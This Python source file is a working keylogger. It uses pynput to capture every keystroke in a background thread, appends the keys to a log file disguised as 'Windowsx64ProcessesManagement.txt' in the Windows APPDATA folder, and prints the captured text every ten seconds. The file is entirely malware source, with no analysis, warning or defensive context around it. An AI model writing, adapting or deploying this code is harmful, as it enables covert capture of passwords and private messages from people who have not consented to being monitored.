import os
from pynput.keyboard import Listener
import time
import threading
from sys import platform

class KeyLogger():
    keys = []
    count = 0
    if platform == "win32":
        path = os.environ["APPDATA"] + "\\Windowsx64ProcessesManagement.txt"
    elif platform == "linux":
        path = "Windowsx64ProcessesManagement.txt"
        
    flag = 0
    def on_press(self, key):
        
        self.keys.append(key)
        self.count+=1

        if self.count>=1:
            self.count = 0
            self.write_file(self.keys)
            self.keys = []

    def write_file(self, keys):

        with open(self.path, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("backspace") > 0:
                    f.write(" Backpace ")
                elif k.find("enter") > 0:
                    f.write("\n")
                elif k.find("shift") > 0:
                    f.write(" Shift ")
                elif k.find("space") > 0:
                    f.write(" ")
                elif k.find("caps_lock") > 0:
                    f.write(" Caps_Lock ")
                elif k.find("Key"):
                    f.write(k)


    def read_keylogs(self):
        with open(self.path, "rt") as f:
            return f.read()

    def terminate_keylogger(self):
        self.flag = 1
        listener.stop()
        os.remove(self.path)

    def start(self):
        global listener

        with Listener(on_press=self.on_press) as listener:
            listener.join()

if __name__ == "__main__":
    keylogger = KeyLogger()
    t = threading.Thread(target=keylogger.start)
    t.start()
    while keylogger.flag != 1:
        time.sleep(10)
        logs = keylogger.read_keylogs()
        print(logs)
        #keylogger.terminate_keylogger()
    t.join() 


